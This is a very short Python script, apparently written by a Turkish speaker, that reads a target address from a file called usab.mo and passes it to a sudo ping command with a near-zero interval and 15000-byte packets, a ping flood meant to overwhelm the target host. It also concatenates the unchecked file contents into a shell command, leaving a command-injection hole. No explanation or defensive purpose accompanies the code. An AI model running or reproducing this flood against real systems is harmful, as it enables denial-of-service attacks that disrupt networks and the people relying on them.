import os
dosya = open("usab.mo","r")
x = dosya.read()
os.system("sudo ping -i 0.0000000000000001 -s 15000 " + x)
